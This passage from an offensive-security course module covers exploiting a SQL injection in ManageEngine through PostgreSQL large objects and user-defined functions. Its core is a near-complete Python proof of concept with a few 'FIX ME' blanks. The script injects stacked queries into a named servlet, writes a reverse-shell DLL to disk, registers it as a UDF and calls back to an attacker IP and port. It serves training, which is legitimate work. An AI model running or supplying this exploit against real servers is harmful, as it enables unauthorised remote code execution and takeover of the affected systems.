6. Inject a query that creates a PostgreSQL User Defined Function (UDF) based on our exported DLL
7. Inject a query that executes our newly created UDF

This sure seems like a lot of work. Moreover, this needs some explanation as well, so let's get to it.

We have already seen how to create a basic PostgreSQL extension, so we can move to step 2.

But why are we even using _lo_import_ first and not directly creating relevant entries in the _pg_largeobject_ table? The main reason for this is because _lo_import_ also creates additional metadata in other tables as well, which are necessary for the _lo_export_ function to work properly. We could do all of this manually, but why?

Next we need to deal with the 2KB page boundaries. You may wonder why we don't simply put our entire payload into page 0 and export that. Sadly, that won't work. If any given page contains more than 2048 bytes of data, _lo_export_ will fail. This is why we have to create additional pages with the same _loid_.

The remainder of our steps should look familiar based on the lessons we previously learned in this module.

There are a few small issues you will need to solve before you can remotely launch a reverse shell on the vulnerable ManageEngine server. Below you will find a proof of concept code that already implements most of the steps we discussed. You just need to put your payload in and fix up the "FIX ME" sections.

```
import requests, sys, urllib, string, random, time
requests.packages.urllib3.disable_warnings()

# encoded UDF rev_shell dll
udf ='YOUR DLL GOES HERE'
loid = 1337

def log(msg):
   print msg

def make_request(url, sql):
   log("[*] Executing query: %s" % sql[0:80])
   r = requests.get( url % sql, verify=False)
   return r

def delete_lo(url, loid):
   log("[+] Deleting existing LO...")
   sql = "SELECT lo_unlink(%d)" % loid
   make_request(url, sql)

def create_lo(url, loid):
   log("[+] Creating LO for UDF injection...")
   sql = "SELECT lo_import($$C:\\windows\\win.ini$$,%d)" % loid
   make_request(url, sql)
   
def inject_udf(url, loid):
   log("[+] Injecting payload of length %d into LO..." % len(udf))
   for i in range(0,((len(udf)-1)/--------FIX ME--------)+1):
         udf_chunk = udf[i*--------FIX ME--------:(i+1)*--------FIX ME--------]
         if i == 0:
             sql = "UPDATE PG_LARGEOBJECT SET data=decode($$%s$$, $$--------FIX ME--------$$) where loid=%d and pageno=%d" % (udf_chunk, loid, i)
         else:
             sql = "INSERT INTO PG_LARGEOBJECT (loid, pageno, data) VALUES (%d, %d, decode($$%s$$, $$--------FIX ME--------$$))" % (loid, i, udf_chunk)
         make_request(url, sql)

def export_udf(url, loid):
   log("[+] Exporting UDF library to filesystem...")
   sql = "SELECT lo_export(%d, $$C:\\Users\\Public\\rev_shell.dll$$)" % loid
   make_request(url, sql)
   
def create_udf_func(url):
   log("[+] Creating function...")
   sql = "create or replace function rev_shell(text, integer) returns VOID as $$C:\\Users\\Public\\rev_shell.dll$$, $$connect_back$$ language C strict"
   make_request(url, sql)

def trigger_udf(url, ip, port):
   log("[+] Launching reverse shell...")
   sql = "select rev_shell($$%s$$, %d)" % (ip, int(port))
   make_request(url, sql)
   
if __name__ == '__main__':
   try:
       server = sys.argv[1].strip()
       attacker = sys.argv[2].strip()
       port = sys.argv[3].strip()
   except IndexError:
       print "[-] Usage: %s serverIP:port attackerIP port" % sys.argv[0]
       sys.exit()
       
   sqli_url  = "https://"+server+"/servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId=1;%s;--" 
   delete_lo(sqli_url, loid)   
   create_lo(sqli_url, loid)
   inject_udf(sqli_url, loid)
   export_udf(sqli_url, loid)
   create_udf_func(sqli_url)
   trigger_udf(sqli_url, attacker, port)
```

> Listing 60 - UDF exercise proof-of-concept

Although we do like our students to earn their shells the hard way, we will provide one hint: _encoding matters_!

#### Exercise

1. Fix the proof of concept script from Listing 60 and obtain a reverse shell.
2. Explain why some encodings will not work.

#### Extra Mile

Use the SQL injection we discovered in this module to create a large object and retrieve the assigned _LOID_ without the use of blind injection. Adapt your final proof of concept accordingly in order to employ this technique avoiding the use of a pre set _LOID_ value (1337).

## 3.9. Summary

In this module we have demonstrated how to discover an unauthenticated SQL injection vulnerability using source code audit in a Java-based web application.

We then showed how to use time-based blind SQL injection payloads along with stack queries in order to exfiltrate database information.

Finally, we developed an exploit that utilized Postgres User Defined Functions and Large Objects to gain a fully functional reverse shell.